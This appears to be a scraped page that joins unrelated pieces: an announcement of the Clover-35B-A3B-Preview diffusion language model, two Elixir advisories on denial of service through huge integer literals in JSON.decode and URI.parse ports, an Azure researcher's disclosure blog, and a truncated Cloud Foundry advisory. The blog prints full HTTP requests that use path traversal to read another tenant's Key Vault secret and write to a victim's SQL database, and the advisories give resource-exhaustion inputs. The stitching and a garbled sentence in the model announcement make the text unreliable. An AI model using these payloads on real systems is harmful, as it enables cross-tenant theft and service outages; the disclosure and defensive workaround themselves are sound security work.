		Clover-35B-A3B-Preview: A New Way for Intelligence
	 
            Community Article        Published
					October 30, 2026                          Upvote  9                                                                 +3                                                DiffuSpace Core Team      DiffuSpaceCoreTeam                  Follow                     Diffuspace                    :last-child]:mb-0">                   Diffusion: Pushing Toward Greater Possibilities           Agentic Coding           On-Device Applications           Demo showcases        Route Planning           WebMCP: Completing Six Business Tasks in Sequence           Creating a Private Project and Inviting Members           GenUI: Building an Interactive Desktop in a Single HTML File           UAV Dispatch: Parsing Compound ATC Messages in Parallel              Ecosystem Partner        3D Science Exploration: Inside the Cell's Energy Factory           Interactive Astronomy: Visualizing How Eclipses Happen              Decision Model        The Same Contract, Five Correlated Judgments           Chinese Chess: Making Sequential Decisions from the Board State              Next Steps                    
 
 Extraordinary things are never achieved by following conventional paths. 
 
 Today, we are officially releasing Clover-35B-A3B-Preview, the first version of DiffuSpace Clover (三叶). 
 In April 2025, the NLP Group at The University of Hong Kong released  Dream 7B . To date, the Dream family of models has accumulated more than 2.7 million downloads on Hugging Face. Building on Dream, members of the team began a new chapter at DiffuSpace, while remaining committed to making AI broadly accessible through open source. 
 If Dream 7B proved that diffusion language models can go toe-to-toe with autoregressive models, Clover sets out to answer a more fundamental question: When scaled up, can diffusion language models maintain their competitiveness while preserving the speed advantage of global generation? 
  Clover-35B-A3B-Preview provides a clear answer: yes. At a larger scale, diffusion language models can even edge out similarly sized autoregressive models while delivering significantly faster generation. Speed and performance can coexist in a single model.  
 Clover-35B-A3B-Preview is a Mixture-of-Experts (MoE) diffusion language model with 35 billion total parameters and 3 billion activated parameters, with support for a thinking mode. Across multiple benchmarks, it outperforms the similarly sized autoregressive model Qwen3.6-35B-A3B, while generating significantly faster. 
 Clover-35B-A3B-Preview particularly excels in agentic coding and tool-use tasks. Across all six agent benchmarks in our comparison, it achieves the highest scores among the evaluated models. Notably, it scores  73.6 on SWE-bench Verified, 51.7 on Terminal-Bench 2.1, and 65.3 on τ³ Overall , outperforming fellow diffusion language models LLaDA2.2 flash and Mercury 2.5, as well as similarly sized autoregressive models Qwen3.6-35B-A3B and Qwen3.5-35B-A3B. 
     
 Clover-35B-A3B-Preview also delivers strong general-purpose capabilities. Across benchmarks covering instruction following, knowledge, logical reasoning, and long-context understanding, it matches or exceeds the performance of similarly sized autoregressive models, achieving  83.8 on GPQA Diamond, 95.8 on ZebraLogic, and 72.0 on AA-LCR . 
     
 In terms of inference efficiency, Clover-35B-A3B-Preview achieves an overall generation speed of  680 tokens/s  on internal agent workloads, tested on a single  NVIDIA GB300 GPU with BF16 precision and a batch size of 1 . Even compared with a similarly sized Qwen model accelerated by DFlash2, Clover offers a better balance between performance and inference speed. On a single  NVIDIA H200 GPU , Clover also reaches  515 tokens/s  on agent tasks, compared with  365 tokens/s  for the DFlash2 setup. These results demonstrate the speed advantage of the diffusion architecture in complex agent workloads. 
     
 Building on Clover-35B-A3B-Preview, we will continue to advance the scaling of diffusion language models, improve model capabilities and inference speed, and validate and refine their performance across a broader range of real-world tasks. 
  Clover-35B-A3B-Preview is now open source under an Apache license.  Model weights and related code are available on Hugging Face and GitHub, with inference support for SGLang and llama.cpp. Developers can download and deploy the model, build applications, and conduct further research on top of Clover. We look forward to working with the community to push the boundaries of what diffusion language models can achieve. 
 Related Links: 
 HuggingFace： https://huggingface.co/Diffuspace/Clover-35B-A3B-Preview  
 GitHub： https://github.com/DiffuSpace/Clover-35B-A3B-Preview  
 ModelScope： https://modelscope.cn/models/Diffuspace/Clover-35B-A3B-Preview  
 Request Online Access： https://chat\.diffuspace\.ai/  
 
	 
		   
	 
	 
		Diffusion: Pushing Toward Greater Possibilities
	 
 
 The leap forward is driven by more than parameter scaling. It also comes from our architectural redesign of the  Gated DeltaNet (GDN)  for Block Diffusion. 
 We redesigned the Bidirectional Gated DeltaNet to handle historical memory and intra-block denoising using different computational mechanisms. Previously generated context is efficiently compressed into GDN's recurrent state, while tokens within the current block interact through fine-grained bidirectional softmax attention. 
 Crucially, we treat the readout from historical memory as a separate  information unit  that participates in the same softmax operation as the tokens within the current block. This allows the model to learn when to rely on historical context and when to draw on information within the current block. We also introduce  learnable block-size calibration  to compensate for the natural dilution of attention to historical memory as the number of tokens within a block increases. For local feature extraction, we add a separate, zero-initialized convolution branch for the right-side context. Starting from the pretrained causal convolution behavior, the model can directly learn distinct features from both left and right contexts. 
 Together, these designs integrate compact long-range memory, selective intra-block interactions, and bidirectional local context modeling, making the GDN architecture better suited to block-level parallel denoising. 
 The speed and performance of Clover-35B-A3B-Preview stem directly from these targeted architectural innovations. 
 
	 
		   
	 
	 
		Agentic Coding
	 
 
 Clover-35B-A3B-Preview goes beyond code completion. It can translate natural-language requirements directly into complete, interactive applications, while also understanding webpages and executing multi-step operations in real browser environments. 
  For AI agents, speed is itself a core capability. Agents operate through continuous cycles of decision-making, execution, feedback, and adjustment. Every generation delay accumulates across the task execution pipeline.  
 Clover's faster generation speeds shorten this feedback loop. Developers can see application previews sooner, while agents can respond to execution results more quickly, adapt their strategies, and move on to the next step. 
 When every step becomes faster, agents can explore more possible paths within the same amount of time and reach results sooner. 
 
	 
		   
	 
	 
		On-Device Applications
	 
 
 Edge computing demands rapid, holistic judgment rather than "slow thinking." 
 For on-device deployment, Clover has been successfully deployed with  INT4 quantization on an NVIDIA RTX 5070 Ti with just 16GB of VRAM . On MATH-500, Clover achieves a generation speed of  101.8 tokens/s , demonstrating a substantial efficiency advantage over the  48.5 tokens/s  recorded in comparison tests with similarly sized MiniCPM and Qwen models. We will continue optimizing the inference engine and on-device deployment setup to further unlock the performance of diffusion language models on resource-constrained devices. 
 We compared Clover-35B-A3B-Preview against representative lightweight, inference-efficient, and on-device-deployable models, including MiniCPM-V 4.7 (35B-A3B), LFM2.5 (24B-A2B), Nemotron 3.5 Lightning (30B-A3B), and Gemma 4 (26B-A4B). 
 Clover achieved the highest scores on  six out of nine benchmarks , demonstrating advantages across knowledge reasoning, tool use, and agentic coding. 
 Notably, Clover scores  51.7 on Terminal-Bench 2.1 and 73.6 on SWE-bench Verified , outperforming MiniCPM-V 4.7, which shares the same 35B-A3B parameter configuration, by  15.7 and 28.0 points , respectively. 
 For tool use, Clover achieves  67.9 on BFCL-v4 and 14.4 on τ³ Banking . For knowledge reasoning, it scores  83.8 on GPQA Diamond and 84.8 on MMLU-Pro , leading all other models included in the comparison on these benchmarks. 
     
 
	 
		   
	 
	 
		Demo showcases
	 
 
 
	 
		   
	 
	 
		Route Planning
	 
 
 
 In this example, the user asks"I am at CMU Pittsburgh，how long it takes to drive to the neareat Wendy's?" 
 However, mapping websites lack spatial location signals, meaning a direct search for the store name incorrectly defaults to Portland, Maine. Clover identifies that the result deviates from the target, progressively refining the search by adding city, neighborhood, and zip code keywords. When the page stalls, it resets and refills the route twice, eventually locating the target store and successfully retrieving a driving distance of  2.0 km and a travel time of roughly 3 minutes . 
 In this comparison, Clover-35B-A3B-Preview completed the task in 28 steps over 169.9hausted all 30 steps and took 578.3 seconds, yet remained stuck at a store 347 km away (approximately 4.5 hours of driving time from the starting point), failing the evaluation criteria. 
 
    

 
	 
		   
	 
	 
		WebMCP: Completing Six Business Tasks in Sequence
	 
 
 
 Using tools exposed through webpages, the model completes a sequence of business tasks, including invoice creation, course registration, amount aggregation, event status checks, and customer information retrieval. 
 The demonstration places multiple business webpages within a single view, comparing tool calls, webpage interactions, and task outcomes. Both models successfully complete the six selected tasks. 
 In the full evaluation covering  49 tasks, with three attempts per task , Clover achieves a median agent execution time of  1.52 seconds , compared with  8.86 seconds for Gemini3.6 Flash . 
 
    


 
	 
		   
	 
	 
		Creating a Private Project and Inviting Members
	 
 
 
 Based on a single prompt, the model is required to create a private project named "planner" and add two designated members. This requires sequential execution of project creation, visibility settings, member searching, and invitations, while consistently maintaining alignment with the user's objective. 
 Under identical agent frameworks, prompts, tools, and browser configurations, Clover-35B-A3B-Preview completed the task in  13 steps and 169.9 seconds , whereas Qwen3.6 Flash took  21 steps and 392.3 seconds . 
 
    


 
	 
		   
	 
	 
		GenUI: Building an Interactive Desktop in a Single HTML File
	 
 
 
 In this example, the user asks the model to create a simulated desktop environment using a single HTML file, complete with draggable windows and multiple functional applications. 
 Clover generates an interactive desktop featuring a dock, a window management system, and applications including a notepad, calculator, clock, weather app, and settings panel. 
 In the demo, users can open apps, input text, operate the calculator, and adjust settings. This task rigorously tests interface layout, interactive logic, and code organization across multiple functional modules, showcasing the generation pipeline from natural language requirements to fully interactive applications. 
 
    

 
	 
		   
	 
	 
		UAV Dispatch: Parsing Compound ATC Messages in Parallel
	 
 
 
 n this urban low-altitude UAV dispatch demo, the model parses a compound air traffic control (ATC) message into multiple tasks, including lifting no-fly restrictions, modifying waypoints, assigning missions, adjusting no-fly zone radii, and emergency dispatch. Clover produces all five correct results together in  0.97 seconds . Qwen presents its results after  3.78 seconds , but incorrectly interprets UAV5's mapping mission as a medical mission. This case demonstrates the advantages of diffusion-based parallel generation in both response speed and task intent understanding when parsing compound instructions. 
 
    

 
	 
		   
	 
	 
		Ecosystem Partner
	 
 
 SigmaZ is our exclusive ecosystem partner for GenUI. They are bringing Clover into education, transforming static text and images into visual experiences that users can explore and interact with. SigmaZ has launched a closed beta demo for educational use. Apply for access at  edu.tap8.ai . We are now beginning joint post-training, aiming to increase token throughput to 2,000 tokens per second and extend real-time visual coding to a broader range of interactive applications. 
 
	 
		   
	 
	 
		3D Science Exploration: Inside the Cell's Energy Factory
	 
 
 
 To explain how cells produce energy, the model builds an interactive 3D explainer with a cutaway view of an animal cell. Users can click organelles to move closer and read explanations, or toggle structural labels, the cutaway view, and rotation to explore the cell from the whole down to its individual components. By bringing knowledge explanations, a 3D scene, and interactive logic together on one page, the demo turns the conversion of glucose into cellular energy from a written description into a process users can understand through observation and interaction. 
 
     
 
	 
		   
	 
	 
		Interactive Astronomy: Visualizing How Eclipses Happen
	 
 
 
 To explain why solar and lunar eclipses do not occur every month, the model builds a time-driven 3D demonstration of the Sun, Earth, and Moon. It brings celestial positions, the tilt of the Moon's orbit, and changing lunar phases into a single scene, making the special alignments required for eclipses visible. 
 Users can drag a timeline to observe the bodies' relative motion, toggle orbits, labels, and shadow cones, or jump to a solar eclipse to see how the Moon's shadow falls on Earth. The page also notes where distances and sizes have been adjusted, balancing visual clarity with an accurate presentation of the underlying scientific concepts. 
 
     
 
	 
		   
	 
	 
		Decision Model
	 
 
 We are also introducing a decision model based on Clover-35B-A3B-Preview for fast, structured judgment tasks. It will be released at a later date. 
 The model supports two response modes: 
  Independent Mode:  The model is called separately for each question, answering one question at a time. This mode is suited to standalone or routine judgments that require a fast response. 
  Joint Mode:  Multiple questions about the same material are grouped together, and their answers are generated in parallel within a single denoising process, with up to eight answers per call. 
 What sets this model apart from TypeSafe Jev and other open-source decision models is Joint Mode's coordinated handling of related decisions. Rather than treating each decision in isolation, it substantially reduces the time spent on repeated interactions and allows judgments to inform one another during generation, helping avoid logical conflicts.  Making multiple related decisions together is not only faster, but also more accurate.  
 In an internal validation set containing  500 groups and 2,420 related questions , Joint Mode answered  95.0%  of individual questions correctly and got every answer right in  80.4%  of question groups. In comparison, the same model in Independent Mode scored  89.8%  and  62.4% , respectively. TypeSafe's decision model Jev scored  63.6%  and  15.8%  in historical evaluations on the same questions. In this validation set, processing related questions together improved both individual-question accuracy and the share of groups with all answers correct. 
 
	 
		   
	 
	 
		The Same Contract, Five Correlated Judgments
	 
 
 
 Rules within the same contract regarding "whether a notice was timely" and "whether a security deposit should be retained" share a logical dependency. When judged independently question by question, a model might simultaneously conclude that a notice was overdue while selecting the "retain deposit" option, which is only permissible if the notice is timely. Joint Mode enables these judgments to be generated concurrently, helping to minimize inconsistencies while reducing the overhead of repeatedly reading material and executing sequential calls. 
 In this validation case, Joint Mode answered all 5 judgments correctly, while Independent Mode answered 4 correctly, and Jev answered 2 correctly. The demo compares judgments on notice deadlines and deposit retention, demonstrating how Joint Mode handles mutually dependent rules. 
 
    

 
	 
		   
	 
	 
		Chinese Chess: Making Sequential Decisions from the Board State
	 
 
 
 The decision model reads the current board state, selects its next move, and outputs a structured move action. In this game against TypeSafe Jev, DiffuSpace's decision model played Black and won. 
 
    


 
	 
		   
	 
	 
		Next Steps
	 
 
 Moving forward, we will continue pushing the boundaries of diffusion language model scaling, expanding multimodal capabilities, enhancing stability in long-horizon tasks, optimizing inference efficiency, and advancing quantization and edge-device adaptation. 
 At the same time, we are developing an  agent execution harness and a desktop coding client  to bring natural-language instructions, tool calls, task execution, and result inspection into a more integrated workflow. These tools are currently under development and will be rolled out shortly. 
    

    

 None of this progress would be possible without the foundations laid by the open-source community. We thank Qwen for its open model architectures and training ecosystem, which provided a reliable starting point for the research behind Clover-35B-A3B-Preview. We also thank the SGLang community for its engineering support for block diffusion inference, and the llama.cpp community for its open integration interfaces and collaborative development process. 
 We invite you to visit  diffuspace.ai  to apply for access to Clover-35B-A3B-Preview.  
     
 Developers can also download model weights from Hugging Face and ModelScope, build applications, or contribute through GitHub Issues and integration efforts. Feedback from real-world tasks will help us continuously improve Clover. We look forward to building together with the open-source community, and we believe diffusion models will be better for it. 
 We also welcome ecosystem partners across a range of use cases to bring diffusion language models into real-world tasks, working together to validate and refine them. 
 "Clover" stands for good luck, while carrying our highest aspirations for diffusion models. 
 Today, Clover breaks new ground, ready to grow across the vast frontier of intelligence.

      Unbounded integer parsing in JSON.decode/1 enables CPU and memory exhaustion denial of service in Elixir

    Description
    
   
  
          Improper Validation of Specified Quantity in Input vulnerability in the Elixir standard library's  JSON  module allows an unauthenticated attacker who supplies a JSON document to cause a denial of service through CPU and memory exhaustion. 
  JSON.decode/1  and  JSON.decode!/1  convert each integer literal with  erlang:binary_to_integer/1  and do not bound its length. A literal of one million digits decodes successfully but costs 100 to 300 times as much CPU as a string of the same length, so one request body of a few megabytes holds a scheduler for about a second. A literal of more than about 1.29 million digits raises  SystemLimitError . Applications generated by  phx.new  decode request bodies with  JSON  in  Plug.Parsers , before routing and authentication. 
 This issue affects elixir: from 1.18.0-rc.0 before 1.18.6, from 1.19.0-rc.0 before 1.19.7, and from 1.20.0-rc.0 before 1.20.5. 
 
      
 

       
   
    Technical analysis
    
   
  
         
            1. Default integer decoder  
  JSON.decode/1  and  JSON.decode!/1  call  JSON.decode/3  without an  integer  decoder. Up to the removal of Erlang/OTP 26 support,  JSON.decode/3  used the vendored  elixir_json  module, whose default is  fun erlang:binary_to_integer/1 . It now calls OTP's  :json.decode/3 , which has the same default. The  JSON.decode/3  documentation names  &String.to_integer/1  as the default, which converts the same way. 
  2. Unbounded conversion  
 The decoder scans the digits of an integer literal and passes the whole run to the conversion. Nothing limits the run's length, so the cost grows faster than linearly with the number of digits. At one million digits an integer literal costs 100 to 300 times as much CPU as a string literal of the same length. Above about 1.29 million digits the conversion raises  SystemLimitError , which  JSON.decode/3  does not catch. 
  3. Reach  
  phx.new  sets  config :phoenix, :json_library, JSON , and the generated endpoint passes  Phoenix.json_library()  to  Plug.Parsers  as  json_decoder .  Plug.Parsers  runs before routing and authentication and accepts bodies up to 8 MB by default. It rescues the  SystemLimitError  into a 400 response after the CPU cost is spent. Jason, the previous default, rejects integer literals longer than its  decoding_integer_digit_limit  (1024 by default) before conversion. 

         
      
 

       
   
    Proof of concept
    
   
  
         
           
 Build  body = "[" <> Enum.map_join(1..7, ",", fn _ -> String.duplicate("9", 1_000_000) end) <> "]" , a body of about 7 MB. 
  JSON.decode(body)  returns  {:ok, ...}  after about one second of CPU. 
  JSON.decode(String.duplicate("9", 1_000_000))  takes 100 to 300 times as long as  JSON.decode("\"" <> String.duplicate("9", 1_000_000) <> "\"") . 
  JSON.decode(String.duplicate("9", 1_400_000))  raises  SystemLimitError .

              An unauthenticated client that sends a JSON body with integer literals of about a million digits makes the server spend about a second of CPU per request and allocate large bignums.     Workarounds
    
   
  
         
           Decode untrusted JSON with an  integer  decoder that rejects long digit runs before conversion: 
  defmodule SafeJSON do
  def decode!(binary) do
    case JSON.decode(binary, :ok, integer: &safe_integer/1) do
      {decoded, :ok, ""} -> decoded
      _ -> raise ArgumentError, "invalid JSON"
    end
  end

  defp safe_integer(digits) when byte_size(digits) <= 1024, do: String.to_integer(digits)
  defp safe_integer(_digits), do: raise(ArgumentError, "integer too long")
end
  
 In Phoenix, pass  SafeJSON  to  Plug.Parsers  as  json_decoder  instead of  Phoenix.json_library() .

    Description
    
   
  
          Improper Validation of Specified Quantity in Input vulnerability in the Elixir standard library's  URI  module allows an attacker who supplies a URL to cause a denial of service through CPU exhaustion. 
  URI.parse/1  converts the port component with  String.to_integer/1  in  split_authority/1  ( lib/elixir/lib/uri.ex ) without bounding its length, so a port of up to 1,262,592 decimal digits produces a bignum of that size and a longer one raises  SystemLimitError . Rendering the parsed URI back to text ( URI.to_string/1 ,  inspect/1 , logging, error formatting) converts the bignum with  :erlang.integer_to_binary/1 , which is quadratic on Erlang/OTP 27, 28 and 29.0: a 400,000-digit port renders in about 2.6 seconds and a 1 MB port in about 18 seconds. Ports above 65535 are also accepted. 
 This issue affects elixir: from 0.5.0 before 1.18.6, from 1.19.0-rc.0 before 1.19.7, and from 1.20.0-rc.0 before 1.20.5. 
 
      
 

       
   
    Technical analysis
    
   
  
         
            1. Unbounded conversion  
  split_authority/1  matches the port with the regex  (:(\d*))?  and converts it with  String.to_integer/1 . Nothing bounds the digit run, so the VM builds an integer of up to 1,262,592 decimal digits (about 30 ms to parse 400,000 digits) and raises  SystemLimitError  above that, which escapes  URI.parse/1  instead of producing a  %URI{} . 
  2. Render cost  
  URI.to_string/1  renders the port with  Integer.to_string/1 , and  inspect/1  renders it the same way, both through  :erlang.integer_to_binary/1 . That conversion is quadratic on OTP 27, 28 and 29.0 and sub-quadratic from OTP 29.1 ( https://github.com/erlang/otp/pull/11074 ). Per GHSA-8qw4-2chm-mvj2 it occupies a dirty CPU scheduler for its full duration. 
  3. Comparison with  URI.new/1   
 Erlang/OTP limited the port to 5 bytes in  :uri_string.parse/1  as part of GHSA-8qw4-2chm-mvj2.  URI.new/1  and  URI.new!/1  use  :uri_string  and get that limit on patched OTP versions.  URI.parse/1  does its own parsing and does not. 
  4. Reach  
 Header-sourced URLs are bounded by HTTP server limits. Form and JSON body fields are not: Plug's default JSON body limit is 8 MB. One observed library path: a user-supplied URL passed to Req inside a Bandit request exits with the port in its arguments, and Bandit's error logging formats it, which took 2.8 seconds at 400,000 digits on OTP 28. 

         
      
 

       
   
    Proof of concept
    
   
  
         
           
 Build  url = "http://example.com:" <> String.duplicate("9", 400_000) . 
  URI.parse(url)  returns in about 30 ms. 
  URI.to_string(URI.parse(url))  takes 2,613 ms on OTP 27.3.4.18, 2,604 ms on OTP 28.5 and 108 ms on OTP 29.1.1. With 200,000 digits it takes 654 ms on OTP 27 and 28, so the cost grows 4x per doubling. 
 The same digits placed in the path instead of the port parse and render in 1 ms or less. 
  URI.parse("http://example.com:65536").port  returns  65536 , and a port of 1,262,593 digits raises  SystemLimitError .

           Reject long URLs before parsing them, for example anything above a few kilobytes, and reject a parsed  port  above 65535 before rendering or using the  %URI{} .     Configurations
    
   
  
         
           The application parses an attacker-supplied URL with  URI.parse/1 , for example a URL field in a form or JSON request body, and then renders the result or a value containing it. The multi-second render cost requires Erlang/OTP 27, 28 or 29.0; on OTP 29.1 and later rendering a 1 MB port takes under a second. URLs in HTTP headers and the request line are bounded by the server's size limits.

                    Azure's Weakest Link - Five Full Cross-Tenant Compromises 
                    Posted by
                        Haakon Wik Gulbrandsrud on October 02, 2026 ·  
     18 mins  read  
                    
                
            
        
        
            In my previous blog posts,  Azure’s Weakest Link?  and  Azure’s Weakest Link - Full Cross-Tenant Compromise , I gave an overview of the severely insecure architecture behind API Connections in Azure, a part of Azure Logic Apps, and an instance of a full cross-tenant compromise using these inherent flaws. Now I am back with some more vulnerabilities in this system, each giving the same primitives to the attacker. In total, the vulnerabilities here netted me a cool $200,000. 
 I also held a talk detailing this at Blue Hat Asia 2026, and when the recordings are out, I will add a link here. 
 TL;DR 
 API Connections allow anyone to fully compromise any other connection worldwide, giving full access to the connected backend. This includes cross-tenant compromise of Key Vaults and Azure SQL databases, as well as any other externally connected service, such as Jira or Salesforce. The only thing stopping exploitation is really the layers of input validation bolted onto the various systems, but as you will see, it is really difficult to catch all the edge cases here. 
 Architecture 
 If you haven’t read the first parts of this series, I would recommend checking those out first,  Azure’s Weakest Link? - Part 1  and  Azure’s Weakest Link - Full Cross-Tenant Compromise , but if you don’t care, I will go through the most important parts of the architecture first. 
 From  Microsoft’s documentation , we see a quite intriguing diagram of how the API Connection architecture is built. 
   
 This basically spells out all that is needed to understand how the system operates, kudos to whoever made it! 
 It works like this 
 
  A logic app, the symbol on the bottom left, queries a shared Azure API Management instance 
  The API Management instance first checks the swagger (OpenAPI) definition of the connector type and checks that it is a valid action 
  A sort of key exchange happens where the input token, or key, is exchanged for the configured token for the backend service 
  The API Management instance finishes the call with this new token to the backend instance. 
 
 From this, we can surmise that if we are able to trick the API Management instance to operate on a different connection than the ones we own, we would be able to effectively use the configured token for a victim’s connection on their backend service. 
 This service can, in effect, be anything. As you can see  here , the list of backend services is effectively unbounded and includes a number of Azure services. 
 However great the diagram is, there is one crucial omission, which we have already used to great effect in part 2 of this series. By using the ARM REST API  DynamicInvoke  or  /extensions/proxy/  endpoints, we can directly query the APIM service through ARM. I have taken the liberty of updating the diagram to match this. 
   
 Considering this, and the fact that, as a resource manager, ARM basically has full access to everything, our exploitation pathway becomes clear. We must trick the calling service into querying a different connection than ours, and thus get full control of the backend service. 
 Caveat: It is, of course, possible for the people who set up these connections to scope their access tokens or keys so that the API Connection has minimal privileges in the backend. I would guess, however, that this is rarely done. In the case of OAuth connections, it will surely always be the token of the person who initially made the connection. And for the API key case, well, who cares enough to scope such things minimally? Microsoft doesn’t, at least. 
 Initial Exploitation 
 The first cross-tenant exploitation I achieved in API Connections, and in fact in Azure as a whole, has already been described in part 2. As a recap, here is an example payload using the  DynamicInvoke  endpoint of my own connection to read the Key Vault of a different tenant. 
     POST   /subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/token-storer/providers/Microsoft.Web/connections/custom2/DynamicInvoke?api-version=2018-07-01-preview   HTTP  /  2 
 Host  :   management.azure.com 
 Authorization  :   Bearer <token> 
 Content-Type  :   application/json 
 Content-Length  :   147 

 {  
      "request"  :{  
          "method"  :  "get"  ,  
          "path"  :  "path/%2e%2e/%2e%2e/%2e%2e/%2e%2e/apim/keyvault/fd8d0f4f4069495991ccb4974f96a1ed/secrets/victimsecret/value"  
      },  
  }  

     
    HTTP/2 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 1329


{
    "response": {
        "statusCode": "OK",
        "body": {
            "value": "dontreadme",
            "name": "victimsecret",
            "version": "7914d45aa60342809fb8cc12dc68b10e",
            "contentType": null,
            "isEnabled": true,
            "createdTime": "2025-04-04T05:38:26Z",
            "lastUpdatedTime": "2025-04-04T05:38:26Z",
            "validityStartTime": null,
            "validityEndTime": null
        },

            <Headers>
        }
    }
}

    
 As you can see, it’s a pretty clear path traversal vulnerability. This implies what we already assumed: When the request fires from ARM to the APIM instance, it has rights to all connections, regardless of what it operates on. 
 Further exploitation 
 A couple of weeks after I reported this vulnerability, it got marked as fixed, and when I tried it again, the following error message greeted me: 
   
 Now, I considered whether or not this was a sufficient fix. It seemed to restrict the paths allowed, rather than the underlying token issue, so I guessed there would be ways around it. 
 An interesting little fact about the ARM API is that, in some cases, it might not be as much of a black box as you assume. The relevant code can  sometimes  be found within the resource types themselves. I do not know whether this code actually executes on these machines or is merely included as an artifact, but it is a gold mine of interesting information. So, I created a Standard Logic App, which provides a fully dedicated host, SSHed into it, and extracted the code. Lo and behold, look what I found: 
   
 Can you see the fix they implemented? 
 What was even more interesting here actually was something I found, and was not really even looking for. When searching for the actual  DynamicInvoke  code, what greeted me was not actually just this one public function, but four: 
   
 These functions are completely undocumented, and I could find no reference to them anywhere. However, they were reachable and located along the same path. So, for instance, to hit  DynamicList  here, simply change  dynamicInvoke  in your URI to  DynamicList . 
 Knowing that the slap-dash blacklisting fix that they implemented only applied to  DynamicInvoke , I assumed that these would all be vulnerable in the same way if they had the same functionality. Without boring you too much with the required arguments and return values here, the exploitation method is really quite the same, although the payload is a bit more involved. For  DynamicList , you need to specify each path parameter on its own and do a bit of work to get a result, but the same logic applies. To achieve, for instance, a cross-tenant write on a victim’s  SQL  server through their connection, a payload like this works: 
     POST   /subscriptions/162fc6db-03cd-4fe8-ab44-dc0a947e74af/resourceGroups/api-connection/providers/Microsoft.Web/connections/custom_validator/DynamicList?api-version=2018-07-01-preview&_=1765372176638   HTTP  /  2 
 Host  :   management.azure.com 
 Authorization  :   Bearer <token> 
 Content-Length  :   524 
 Content-Type  :   application/json 

 
  {  
      "dynamicInvocationDefinition"  :     {  
          "operationID"  :     "nine"  ,  
          "parameters"  :     {  
              "one"  :     {  
                  "value"  :     ".."  
              },  
              "two"  :     {  
                  "value"  :     ".."  
              },  
              "three"  :     {  
                  "value"  :     "sql"  
              },  
              "four"  :     {  
                  "value"  :     "88d28f5ff7b642cfb91df184938d074c"  
              },  
              "five"  :     {  
                  "value"  :     "v2"  
              },  
              "six"  :     {  
                  "value"  :     "datasets"  
              },  
              "seven"  :     {  
                  "value"  :     "victimservice.database.windows.net,VictimDatabase"  
              },  
              "eigth"  :     {  
                  "value"  :     "query"  
              },  
              "nine"  :     {  
                  "value"  :     "sql"  
              },  
              "query"  :     {  
                  "value"  :     {  
                      "query"  :     "Insert INTO MySecrets VALUES ('NewEvilSecrets', 3)"  
                  }  
              }  
          },  
          "ItemsPath"  :     "ResultSets/Table1"  ,  
          "ItemValuePath"  :     "secrets"  ,  
          "ItemTitlePath"  :     "value"  
      }

 You can quite easily see that the first parameters here execute the path traversal and then perform an arbitrary  SQL  query on the database. 
 I reported only the  DynamicList  case first, in the hope that they would perform a similar fix to  DynamicInvoke  and I would get to report on the other two as well. Sadly, their fix involved simply blocking all these endpoints. No other mitigations seem to be in place, however, so if these endpoints ever become accessible again, I would assume they would be vulnerable. 
 Further exploitation 
 Messing around with paths in these dynamic calls seemed to have reached its conclusion: I couldn’t get past the path limitations on  DynamicInvoke , and all the other endpoints were blocked. What I needed was a different way in. As I was trying to sleep one day, it occurred to me that I had overlooked using the Logic Apps themselves. I realized that there was, in fact, a significant difference between the Consumption and Standard Logic Apps connection-creation flows. The most glaring difference is that Consumption Logic Apps, where your workflow is co-located with a bunch of others, create a Version 1 connection, while the dedicated-host Standard Logic Apps create a Version 2 connection. The following diagrams make a more subtle difference between the flows clear: 
   
   
 Do you see the difference? Obviously, when it’s spelled out like that, it’s pretty clear what the point is. Using a Standard Logic App, after we have created the resource and added whatever authentication to the backend server we need, we authorize that specific logic app to access it using its managed identity. However, when we have a Consumption Logic App, we don’t have any such identity to authorize because we don’t control it. This perhaps makes some sense: we can’t authorize it, so we don’t. 
 I realized that this must imply that every Consumption Logic App has implicit access to  every  Version 1 API Connection; the only thing stopping us from exploiting this must be some sort of input validation. 
 The classic view of a Logic App workflow is quite restrictive in its input, but there are both the API endpoints, and the  Code  view in the GUI that allow us to play around a bit more with the inputs. 
   
 This allows us to see the inputs in more detail, edit them, and even add more. The obvious trick of changing the referenced connector to a victim’s connection fails, as the runtime performs extensive validation that you own the connection. We have the codebase, though, so we can try to find all the valid parameters. It did not take much searching for me to discover the  host.api.RuntimeUrl  parameter. 
 I can’t quite get my head around why this parameter is included, nor why it’s still accepted to this day, but it works in the way you would expect. After performing a series of validations on the connection referenced in  host.connection , you can specify that it should use something completely different instead of the  runtimeUrl  baked into that connection. As long as the host ends with  azure-apihub.net , it will also include the required Authorization header. 
   
 What happens when this workflow is run then? 
   
 The keen-eyed reader might notice that the  runtimeUrl  used in the exploit is not just the  connectionId . This is because some extra elements get added to the URI, but it is of no consequence to us; the exploit works fine. 
 Manna from the heavens 
 I, of course, reported this to Microsoft again, and they spent some time working up a fix. When it finally came through, the exploit returned an error message: 
    The host API runtime URL is not valid for the API connection '/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/token-storer/providers/Microsoft.Web/connections/keyvault-1'. The runtime URL path must match the expected API endpoint 'https://logic-apis-norwayeast.azure-apihub.net/apim/keyvault/cbfb0f4313144117a7440368902bb871?' for the referenced connection. Either omit the 'host.api' input property, or correct the runtime URL to match the API associated with the connection.
    
 Except for the excessive length of this message, it seems like quite a suitable fix. The runtime URL must exactly match what is expected; otherwise, no dice. Apart from just removing the parameter altogether, it’s quite sane. Unless, of course, it checks that value at the wrong time: 
   
 This works again, with the same result. What’s going on here is that the validation happens before the path is normalized, so the runtime thinks the URI is pointing to my referenced connection, but the APIM instance sees it differently. 
 And just like that, I got another critical vulnerability. 
 The fun does not stop there. When Microsoft managed to scrape together a fix for this path traversal, a surprising thing happened. The original  RuntimeUrl  path was no longer validated, and as a result, you could perform that attack again. I would include some pictures, but they would be the same pictures as above, so you can just imagine them. 
 Reporting and rewards 
 Altogether, API Connections have netted me five critical elevation-of-privilege vulnerabilities in Azure, which is perhaps more than expected. All vulnerabilities reported here were fixed within a reasonable time after I submitted the reports, and while there were some disagreements with MSRC along the way, overall, I am quite happy with the results.

                    Security Advisory                    
                    CVE-2026-59387 – broken access control restriction in Cloud Controller API 
        
         
             
                                     by:  Cloud Foundry Foundation Security Team  
                                                     October 20, 2026 
                             
             
                 Share 
                 
                      
                     
                     
                         Share 
                     
                     Tweet 
                 
             
         
        
 
 
    
     
                     
                 
                      Severity  
  High  
  CVSS score: 8.8 (High) (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)  
   
  Vendor  
  Cloud Foundry Foundation  
   
  Versions Affected  
